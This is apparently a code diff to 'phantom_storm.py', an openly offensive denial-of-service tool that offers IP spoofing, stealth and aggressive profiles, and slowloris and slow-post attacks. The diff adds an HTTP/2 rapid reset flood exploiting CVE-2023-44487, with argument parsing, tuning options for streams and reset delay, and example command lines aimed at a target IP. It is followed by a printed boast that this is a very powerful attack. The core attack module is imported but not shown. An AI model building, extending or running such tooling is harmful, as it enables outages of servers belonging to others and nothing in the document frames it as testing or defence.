@@ -171,9 +171,11 @@ def main():
         print(f"  --no-spoof         Disable IP spoofing")
         print(f"  --method=METHOD    HTTP method (GET, POST, HEAD, OPTIONS, PUT, DELETE)")
         print(f"  --random-method    Use random HTTP method for each request")
-        print(f"  --attack-type=TYPE Attack type (slowloris, slow-post)")
+        print(f"  --attack-type=TYPE Attack type (slowloris, slow-post, http2-rapid-reset)")
         print(f"  --content-length=N Content-Length for slow POST (default: 1000000)")
-        print(f"  --post-delay=N     Delay between bytes for slow POST in seconds (default: 10.0)\n")
+        print(f"  --post-delay=N     Delay between bytes for slow POST in seconds (default: 10.0)")
+        print(f"  --h2-streams=N     Streams per connection for HTTP/2 rapid reset (default: 1000)")
+        print(f"  --h2-reset-delay=N Delay between HEADERS and RST_STREAM in seconds (default: 0.0)\n")
         print(f"{Colors.OKBLUE}Examples:{Colors.ENDC}")
         print(f"  python phantom_storm.py 192.168.1.100 80 200")
         print(f"  python phantom_storm.py 192.168.1.100 443 200 --https")
@@ -181,7 +183,9 @@ def main():
         print(f"  python phantom_storm.py 192.168.1.100 80 200 --profile=stealth")
         print(f"  python phantom_storm.py 192.168.1.100 443 200 --profile=aggressive --https")
         print(f"  python phantom_storm.py 192.168.1.100 80 200 --attack-type=slow-post")
-        print(f"  python phantom_storm.py 192.168.1.100 443 200 --attack-type=slow-post --https --content-length=500000 --post-delay=5.0\n")
+        print(f"  python phantom_storm.py 192.168.1.100 443 200 --attack-type=slow-post --https --content-length=500000 --post-delay=5.0")
+        print(f"  python phantom_storm.py 192.168.1.100 443 100 --attack-type=http2-rapid-reset --h2-streams=2000")
+        print(f"  python phantom_storm.py 192.168.1.100 443 50 --attack-type=http2-rapid-reset --h2-streams=1000 --h2-reset-delay=0.001\n")
         sys.exit(1)
     
     target_ip = sys.argv[1]
@@ -204,6 +208,8 @@ def main():
     attack_type = AttackType.SLOWLORIS  # Default
     slow_post_size = 1000000            # 1MB default
     slow_post_delay = 10.0              # 10 seconds per byte default
+    h2_streams_per_conn = 1000          # 1000 streams per connection
+    h2_reset_delay = 0.0                # Immediate RST (0 delay)
     
     for arg in sys.argv[4:]:
         if arg.startswith('--profile='):
@@ -271,14 +277,20 @@ def main():
                     attack_type = AttackType.RANGE_HEADER
                 elif attack_type_str == 'cache-bypass':
                     attack_type = AttackType.CACHE_BYPASS
+                elif attack_type_str == 'http2-rapid-reset':
+                    attack_type = AttackType.HTTP2_RAPID_RESET
                 else:
                     print(f"{Colors.FAIL}[ERROR] Invalid attack type: {attack_type_str}{Colors.ENDC}")
-                    print(f"Valid types: slowloris, slow-post, slow-read, range-header, cache-bypass\n")
+                    print(f"Valid types: slowloris, slow-post, slow-read, range-header, cache-bypass, http2-rapid-reset\n")
                     sys.exit(1)
             elif arg.startswith('--content-length='):
                 slow_post_size = int(arg.split('=')[1])
             elif arg.startswith('--post-delay='):
                 slow_post_delay = float(arg.split('=')[1])
+            elif arg.startswith('--h2-streams='):
+                h2_streams_per_conn = int(arg.split('=')[1])
+            elif arg.startswith('--h2-reset-delay='):
+                h2_reset_delay = float(arg.split('=')[1])
     
     # Create TLS config
     tls_config = TLSConfig(
@@ -302,6 +314,17 @@ def main():
         duration = SlowPostHelper.calculate_attack_duration(slow_post_size, slow_post_delay)
         duration_str = SlowPostHelper.format_duration(duration)
         print(f"{Colors.WARNING}[!] Estimated attack duration per connection: {duration_str}{Colors.ENDC}")
+    
+    elif attack_type == AttackType.HTTP2_RAPID_RESET:
+        print(f"{Colors.OKCYAN}[*] HTTP/2 Streams per Connection: {h2_streams_per_conn:,}{Colors.ENDC}")
+        print(f"{Colors.OKCYAN}[*] HTTP/2 RST Delay: {h2_reset_delay} seconds{Colors.ENDC}")
+        
+        # Calculate streams per second
+        from src.core.http2_rapid_reset import H2RapidResetHelper
+        streams_per_sec = H2RapidResetHelper.calculate_streams_per_second(h2_streams_per_conn, h2_reset_delay)
+        print(f"{Colors.WARNING}[!] Estimated streams/sec: {streams_per_sec:,.0f}{Colors.ENDC}")
+        print(f"{Colors.WARNING}[!] This is a VERY POWERFUL attack (CVE-2023-44487){Colors.ENDC}")
+        print(f"{Colors.WARNING}[!] Requires HTTPS target with HTTP/2 support{Colors.ENDC}")
     
     if use_https:
         print(f"{Colors.OKCYAN}[*] TLS Version: {tls_version}{Colors.ENDC}")
@@ -379,7 +402,9 @@ def main():
             tls_config=tls_config,
             attack_type=attack_type,
             slow_post_size=slow_post_size,
-            slow_post_delay=slow_post_delay
+            slow_post_delay=slow_post_delay,
+            h2_streams_per_conn=h2_streams_per_conn,
+            h2_reset_delay=h2_reset_delay
         )
         thread = threading.Thread(target=worker.run, daemon=True)
         thread.start()
